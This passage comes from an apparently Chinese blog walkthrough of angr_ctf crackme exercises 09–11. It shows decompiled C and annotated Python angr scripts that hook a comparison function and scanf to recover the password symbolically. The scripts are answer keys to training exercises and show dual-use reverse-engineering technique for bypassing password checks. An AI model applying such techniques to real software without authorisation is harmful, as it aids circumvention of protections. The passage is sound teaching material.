alt=""></p><p>注意到下一条指令和函数<code>check_equals_MRXJKZYRKMKENFZB</code>之间间隔5个字节，因此我们要跳过的长度即5字节</p><p>下面是最终的题解，我会在必要的地方添加注释，帮助理解：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">'09_angr_hooks'</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>    <span class="token comment"># 直接从入口开始</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>    check_equals_called_address <span class="token operator">=</span> <span class="token number">0x080486B3</span>    <span class="token comment"># 检测函数的长度</span>    instruction_to_skip_length <span class="token operator">=</span> <span class="token number">5</span>    <span class="token decorator annotation punctuation">@project<span class="token punctuation">.</span>hook</span><span class="token punctuation">(</span>check_equals_called_address<span class="token punctuation">,</span> length<span class="token operator">=</span>instruction_to_skip_length<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">skip_check_equals_</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 此时需要从内存中读取buffer的内容，设定buffer的地址和要读取的长度</span>        user_input_buffer_address <span class="token operator">=</span> <span class="token number">0x0804A054</span>  <span class="token comment"># :integer, probably hexadecimal</span>        <span class="token comment"># 字符串长度16字节</span>        user_input_buffer_length <span class="token operator">=</span> <span class="token number">16</span>        <span class="token comment"># 从内存中读取数据</span>        user_input_string <span class="token operator">=</span> state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>            user_input_buffer_address<span class="token punctuation">,</span>            user_input_buffer_length        <span class="token punctuation">)</span>        check_against_string <span class="token operator">=</span> <span class="token string">'MRXJKZYRKMKENFZB'</span>  <span class="token comment"># :string</span>        <span class="token comment"># 如果相等返回1，否则返回0</span>        state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> claripy<span class="token punctuation">.</span>If<span class="token punctuation">(</span>            user_input_string <span class="token operator">==</span> check_against_string<span class="token punctuation">,</span>            claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Success, flag is &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210506224557.png" alt=""></p><h2 id="10-angr-simprocedures"><a href="#10-angr-simprocedures" class="headerlink" title="10_angr_simprocedures"></a>10_angr_simprocedures</h2><div class="note note-success">            <p>本题依旧是对<code>hook</code>的使用，只不过上一题采用函数地址，本次采用函数名，相比函数地址更加方便</p>          </div><p>看下源码：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+20h] [ebp-28h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+2Bh] [ebp-1Dh]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-Ch]</span>  v6 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>password<span class="token punctuation">,</span> <span class="token string">"MRXJKZYRKMKENFZB"</span><span class="token punctuation">,</span> <span class="token number">0x10u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x11u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%16s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">complex_function</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">18</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">check_equals_MRXJKZYRKMKENFZB</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>_BOOL4 __cdecl <span class="token string">''</span>check_equals_MRXJKZYRKMKENFZB<span class="token string">''</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-8h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-4h]</span>  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a2<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">134529096</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token operator">++</span>v3<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v3 <span class="token operator">==</span> a2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>程序与上一题一样，本题需要用到<code>angr.SimProcedure</code>来替代二进制文件中指定函数的部分，说白了就是自己写一个函数替代原有的函数，很明显我们针对的是<code>check_equals_MRXJKZYRKMKENFZB()</code>。</p><div class="note note-info">            <p><code>angr.SimProcedure</code>实现了用<code>python</code>编写替代原有函数的功能，通过继承<code>SimProcedure</code>，重写<code>run(self, *args)</code>方法，传入的参数(BV类型)和原有函数的参数对应，并按照<code>pythonic</code>的方式返回，用以提供给<code>angr</code>像原来函数一样处理。</p>          </div><p>下图展示了这一思想：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210510172435.png" alt=""></p><p>前面09题说了，我们有两种<code>hook</code>方式，这里因为我们要处理参数和返回值，因此采用继承<code>angr.SimProcedure</code>的方式。</p><p>下面是题解，我会在必要的地方添加注释，帮助理解：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">'10_angr_simprocedures'</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 通过继承angr.SimProcedure实现对模拟函数的创建</span>    <span class="token keyword">class</span> <span class="token class-name">ReplacementCheckEquals</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 重写run方法，self之后的参数与原始函数是对应的</span>        <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> to_check<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 对比原是函数，我们知道第一个参数是字符串的起始地址，第二个是字符串长度</span>            user_input_buffer_address <span class="token operator">=</span> to_check            user_input_buffer_length <span class="token operator">=</span> length            <span class="token comment"># 利用memory.load方法，从已知内存地址中读取指定长度的内容</span>            user_input_string <span class="token operator">=</span> self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>                user_input_buffer_address<span class="token punctuation">,</span>                user_input_buffer_length            <span class="token punctuation">)</span>            check_against_string <span class="token operator">=</span> <span class="token string">'MRXJKZYRKMKENFZB'</span>            <span class="token comment"># 这部分是我们比较过程，和前面一题是一样的，利用claripy.If，第一个参数是布尔判断条件，为真返回第二个参数，</span>            <span class="token comment"># 为假返回第三个参数，参数返回值应该是bitvector常量</span>            <span class="token keyword">return</span> claripy<span class="token punctuation">.</span>If<span class="token punctuation">(</span>                user_input_string <span class="token operator">==</span> check_against_string<span class="token punctuation">,</span>                claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span>    <span class="token comment"># 调用hook_symbol前，确定需要hook的函数名称，因为hook_symbol是基于函数名进行API调用的</span>    check_equals_symbol <span class="token operator">=</span> <span class="token string">'check_equals_MRXJKZYRKMKENFZB'</span> <span class="token comment"># :string</span>    project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span>check_equals_symbol<span class="token punctuation">,</span> ReplacementCheckEquals<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># 后面的和前一题一样</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Success, flag is &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210510193123.png" alt=""></p><h2 id="11-angr-sim-scanf"><a href="#11-angr-sim-scanf" class="headerlink" title="11_angr_sim_scanf"></a>11_angr_sim_scanf</h2><div class="note note-success">            <p>本题学习<code>hook scanf</code>函数，之前一直是在<code>scanf</code>之后对输入的结果做符号化，本次直接模拟<code>scanf</code>的执行</p>          </div><p>老规矩，源码走一波：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  _BOOL4 v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+20h] [ebp-28h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+28h] [ebp-20h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+2Ch] [ebp-1Ch]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-Ch]</span>  v8 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token string">'ZREX'</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token string">'BNTZ'</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">complex_function</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u %u"</span><span class="token punctuation">,</span> buffer0<span class="token punctuation">,</span> buffer1<span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>buffer0<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>buffer1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v7<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>程序就不解释了，因为本题是要模拟<code>scanf</code>，依照上题对函数模拟的思路：</p><ol><li>首先，我们先将模拟的部分摸清楚，对于<code>scanf</code>，首先第一个传入的参数是格式化字符串<code>%u %u</code>(函数调用的时候也是先将格式化字符串压栈)，然后依次传入<code>buffer0,buffer1</code></li><li><p>接下来我们要模拟输入两个变量到<code>buffer</code>中，本质上就是写入两个符号变量到内存里，因此，在模拟函数中，创建<code>claripy.BVS(&#39;scanf&#39;, 32)</code>对象，并利用<code>state.memory.store()</code>方法将变量写入内存</p></li><li><p>由于定义的符号变量位于<code>run()</code>方法内部，使得在<code>simulation.found</code>之后无法进行约束求解，因此还需要将这个两个局部变量放到全局中，解决方法可以是改用全局变量，然后在<code>run</code>内部使用<code>global</code>关键字，或者采用<code>state.globals[key]=value</code>的方式存储。</p></li></ol><p>下面是题解，我会在必要的地方添加注释，帮助理解：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">'11_angr_sim_scanf'</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">,</span> auto_load_libs<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">class</span> <span class="token class-name">ReplacementScanf</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># run现在模拟scanf，第一个参数是格式化字符串，接着传入两个buffer地址</span>        <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> format_string<span class="token punctuation">,</span> scanf0_address<span class="token punctuation">,</span> scanf1_address<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 定义两个符号变量，用于写入buffer</span>            scanf0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'scanf0'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>            scanf1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'scanf1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>            <span class="token comment"># 写入内存，最后一个参数指定字节序</span>            self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>scanf0_address<span class="token punctuation">,</span> scanf0<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>scanf1_address<span class="token punctuation">,</span> scanf1<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span>            <span class="token comment"># 保存变量到全局，方便后续约束求解</span>            self<span class="token punctuation">.</span>state<span class="token punctuation">.</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'solution0'</span><span class="token punctuation">]</span> <span class="token operator">=</span> scanf0            self<span class="token punctuation">.</span>state<span class="token punctuation">.</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'solution1'</span><span class="token punctuation">]</span> <span class="token operator">=</span> scanf1    <span class="token comment"># scanf的函数名称，用ida反编译得到的</span>    scanf_symbol <span class="token operator">=</span> <span class="token string">'__isoc99_scanf'</span>    project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span>scanf_symbol<span class="token punctuation">,</span> ReplacementScanf<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token 